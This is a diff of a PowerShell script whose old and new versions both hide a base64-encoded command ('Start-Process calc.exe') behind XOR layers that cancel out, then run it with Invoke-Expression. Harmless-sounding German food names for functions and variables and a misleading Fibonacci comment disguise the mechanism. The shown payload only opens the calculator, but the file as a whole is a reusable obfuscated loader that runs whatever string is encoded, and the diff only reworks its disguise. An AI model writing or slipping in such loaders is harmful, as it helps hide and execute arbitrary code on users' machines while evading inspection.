@@ -1,33 +1,31 @@
-function R2 { param([byte[]]$x,[byte[]]$y) $z=New-Object byte[] $x.Length; for($i=0;$i -lt $x.Length;$i++){ $z[$i]=$x[$i]-bxor $y[$i % $y.Length] }; $z }
+function Fruehstueck { 
+    param($n) 
+    $a=0; $b=1; for($i=0;$i -lt $n;$i++){ $t=$a+$b; $a=$b; $b=$t } 
+    return $t 
+}
 
-$fruehstueck="U3RhcnQtUHJvY2VzcyBjYWxjLmV4ZSA="
-$s1=$fruehstueck.Substring(0,4)
-$s2=$fruehstueck.Substring(4,5)
-$s3=$fruehstueck.Substring(9,4)
-$s4=$fruehstueck.Substring(13,6)
-$s5=$fruehstueck.Substring(19,3)
-$s6=$fruehstueck.Substring(22,5)
-$s7=$fruehstueck.Substring(27)
-$gekocht=$s1+$s2+$s3+$s4+$s5+$s6+$s7
+function Mittagessen {
+    param([byte[]]$x,[byte[]]$y)
+    $z=New-Object byte[] $x.Length
+    for($i=0;$i -lt $x.Length;$i++){ $z[$i]=$x[$i]-bxor $y[$i % $y.Length] }
+    return $z
+}
 
-function Mittagessen { param($n) $a=0;$b=1; for($i=0;$i -lt $n;$i++){ $t=$a+$b;$a=$b;$b=$t }; $b }
-function Abendessen { param($n) $a=Get-Random -Minimum 1 -Maximum 10;$b=Get-Random -Minimum 1 -Maximum 10; for($i=0;$i -lt $n;$i++){ $t=$a+$b+Get-Random -Minimum 0 -Maximum 3; $a=$b;$b=$t }; $b }
+$abendbrot="U3RhcnQtUHJvY2VzcyBjYWxjLmV4ZQ=="
 
-$kaffee=Mittagessen 10
-$kuchen=Abendessen 10
+# dynamische Fibonacci-Zahl
+$zufall=Get-Random -Minimum 1 -Maximum 5
+$frucht=$zufall
+$fib=Fruehstueck $frucht
+$essen=[Text.Encoding]::UTF8.GetBytes($abendbrot)
+$trinken=[Text.Encoding]::UTF8.GetBytes($fib.ToString())
 
-$suppe=[Text.Encoding]::UTF8.GetBytes($gekocht)
-$brot=[Text.Encoding]::UTF8.GetBytes([math]::Round($kaffee))
-$salat=[Text.Encoding]::UTF8.GetBytes([math]::Round($kuchen))
+$gekocht=Mittagessen -x $essen -y $trinken
+$gegessen=Mittagessen -x $gekocht -y ($trinken[($trinken.Length-1)..0])
+$gericht=[Text.Encoding]::UTF8.GetString($gegessen)
 
-$wurst=R2 -x $suppe -y $brot
-$kartoffel=R2 -x $wurst -y $salat
-$spiegelei=[Text.Encoding]::UTF8.GetString($kartoffel)
+$final=Mittagessen -x ([Text.Encoding]::UTF8.GetBytes($gericht)) -y ($trinken[($trinken.Length-1)..0])
+$fertig=Mittagessen -x $final -y $trinken
+$ausfuehren=[Convert]::FromBase64String([Text.Encoding]::UTF8.GetString($fertig))
+iex ([Text.Encoding]::UTF8.GetString($ausfuehren))
 
-$nudeln=R2 -x ([Text.Encoding]::UTF8.GetBytes($spiegelei)) -y $salat
-$fisch=R2 -x $nudeln -y $brot
-$dessert=[Text.Encoding]::UTF8.GetString($fisch)
-
-$kakao=[Convert]::FromBase64String($dessert)
-$abend=[Text.Encoding]::UTF8.GetString($kakao)
-Invoke-Expression $abend
